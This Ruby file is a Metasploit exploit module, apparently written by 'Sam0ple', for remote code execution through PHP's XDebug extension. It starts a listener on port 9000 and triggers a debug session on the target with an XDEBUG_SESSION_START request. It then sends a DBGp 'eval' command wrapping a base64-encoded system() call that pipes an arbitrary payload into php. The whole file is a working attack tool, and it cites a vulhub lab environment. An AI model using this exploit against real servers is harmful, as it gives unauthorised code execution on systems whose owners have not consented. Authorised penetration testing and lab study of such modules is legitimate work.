require 'socket'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'=>'XDebug remote debug RCE',
      'Description'=>
    %q{
XDebug is a extension of PHP that debug PHP code.If the target start the remote debug mode,
and set xdebug.remote_connect_back=1 and xdebug.remote_enable=1,we can connect with it by dbgp 
and execute the php code using eval supplied by dbgp protocol.
 },
      'Author' => [
        'Sam0ple' #Metasploit module
      ],
      'License'=>MSF_LICENSE,
      'References'=>
      [
        'https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce'
      ],
      'Privileged'=>false,
      'Platform'=>['php'],
      'Arch'=>ARCH_PHP,
      'Payload'=> {
      },
      'Targets'=>[
        ['Automatic',{}]
      ],
      'DefaultTarget'=>0))
    register_options(
      [
        OptString.new('TARGETURI',[true,'The base path to php with xdebug','/?XDEBUG_SESSION_START=']),
        OptString.new('XDEBUG_PASSWORD',[true,'The Password connect to xdebug','phpstorm']),
        OptPort.new('SRVPORT',[true,'The connect back port',9000]),
        OptString.new('SRVHOST',[true,'The connect back host','0.0.0.0'])
      ]
    )
  end

  def trigger
    sleep(1)
    uri = datastore['TARGETURI']+datastore['XDEBUG_PASSWORD']
    print_status("send the request")
    send_request_cgi(
      'uri'=>uri
    )
  end

  def exploit
    srvhost = datastore['SRVHOST']
    srvport = datastore['SRVPORT']

    socket = Rex::Socket::TcpServer.create({'LocalHost'=>'0.0.0.0','LocalPort'=>srvport})
    begin
      t = Thread.new{trigger()}
      t.join
      rsock = socket.accept()
      print_status('Accept a connection')
      request = rsock.read(1024)
      print_status("#{request}")
      print_status("send code is:#{command}")
      rsock.puts(command)
    ensure
      rsock.close
      socket.close
    end
  end

  def command
    #command = "eval -i 1 -- #{Rex::Text.encode_base64(payload)}" + "\x00"
    base64_payload = Rex::Text.encode_base64(payload.encode)
    args = "system('echo #{base64_payload} | base64 -d | php')"
    command = "eval -i 1 -- #{Rex::Text.encode_base64(args)}" + "\x00"
    command
  end
end
